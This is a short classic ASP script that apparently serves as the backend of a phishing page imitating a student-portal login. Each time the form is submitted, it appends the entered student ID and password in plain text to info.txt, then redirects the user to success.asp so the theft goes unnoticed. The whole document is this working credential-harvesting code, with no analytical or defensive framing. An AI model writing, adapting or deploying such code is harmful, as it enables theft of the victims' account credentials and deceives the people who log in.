<%
IF NOT Request.Form("PtUser")=""    Then
Set MyFileObject=Server.CreateObject("Scripting.FileSystemObject")
Set MyTextFile=MyFileObject.OpenTextFile("info.txt",8,TRUE)   
MyTextFile.WriteLine("StudentID:"&Request.Form("PtUser")&" Password:"&Request.Form("PtPwd"))
MyTextFile.Close 
END IF
Response.Redirect("success.asp")
%>